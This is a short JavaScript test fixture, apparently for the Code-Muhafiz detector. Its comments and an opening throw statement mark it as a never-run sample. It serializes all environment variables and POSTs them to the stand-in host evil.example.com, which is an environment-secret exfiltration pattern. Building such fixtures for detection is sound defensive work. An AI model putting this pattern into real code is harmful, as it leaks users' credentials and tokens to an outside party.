// TEST FIXTURE — intentionally suspicious, never run.
// Mimics an environment-variable exfiltration pattern for Code-Muhafiz detectors.
// evil.example.com is a reserved example domain and does not resolve to a real attacker.
throw new Error('Code-Muhafiz test fixture: never execute this file.');
const payload = JSON.stringify(process.env);

fetch('https://evil.example.com/collect', {
  method: 'POST',
  body: payload,
});
